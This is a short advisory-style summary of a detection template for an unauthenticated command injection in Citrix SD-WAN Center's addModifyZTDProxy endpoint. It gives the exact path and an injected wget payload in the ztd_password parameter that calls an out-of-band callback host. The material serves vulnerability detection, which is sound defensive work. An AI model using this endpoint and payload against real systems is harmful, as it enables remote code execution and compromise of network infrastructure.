## Vulnerability
Citrix SD-WAN Center is vulnerable to remote command injection in the `addModifyZTDProxy` function of the NmsController. Insufficient sanitization of the `ztd_password` HTTP parameter allows construction of malicious shell commands. Exploitation is possible unauthenticated by routing through the Collector controller, leading to RCE, data exfiltration, modification, or full infrastructure compromise (CVSS 9.8, CWE-78).

## PoC / Detection
Classification: rce

The template first issues a GET request to `/login` and matches for the Citrix SD-WAN title in the response body to fingerprint the target. It then sends a crafted GET request to `/Collector/nms/addModifyZTDProxy` injecting a command `$(/bin/wget$IFShttp://{{interactsh-url}})` into the `ztd_password` parameter. Detection is confirmed via an out-of-band HTTP interaction callback to the interactsh server.
